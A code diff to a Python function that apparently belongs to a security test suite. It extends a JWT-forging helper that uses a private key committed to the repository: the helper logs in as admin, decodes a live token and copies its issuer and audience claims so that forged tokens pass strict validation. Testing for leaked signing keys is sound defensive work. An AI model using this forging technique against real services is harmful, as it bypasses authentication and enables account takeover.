@@ -326,8 +326,34 @@ def committed_key_forge(stack_config: dict, live_jwks_keys: list[dict]):
 
     key_pem = priv_path.read_text()
 
+    # Extract iss/aud from a live token so forged tokens satisfy strict claim
+    # validation (auth-sdk >= 1.0.0).  An attacker with repo access can trivially
+    # obtain a real token and read these unencrypted values from the JWT payload.
+    _live_iss: str | None = None
+    _live_aud: str | None = None
+    try:
+        import base64 as _b64
+        import json as _json
+
+        sample = requests.post(
+            f"{AUTH_BASE}/login/access-token",
+            data={"username": _ADMIN_EMAIL, "password": _ADMIN_PASSWORD},
+            timeout=TIMEOUT,
+        )
+        if sample.status_code == 200:
+            raw = sample.json()["access_token"].split(".")[1]
+            sample_payload = _json.loads(
+                _b64.urlsafe_b64decode(raw + "=" * (-len(raw) % 4))
+            )
+            _live_iss = sample_payload.get("iss")
+            _live_aud = sample_payload.get("aud")
+    except Exception:
+        pass
+
     def _forge(**kw) -> str:
         kw.setdefault("kid", live_kid)
+        kw.setdefault("iss", _live_iss)
+        kw.setdefault("aud", _live_aud)
         return forge_asymmetric(key_pem, live_alg, **kw)
 
     return _forge
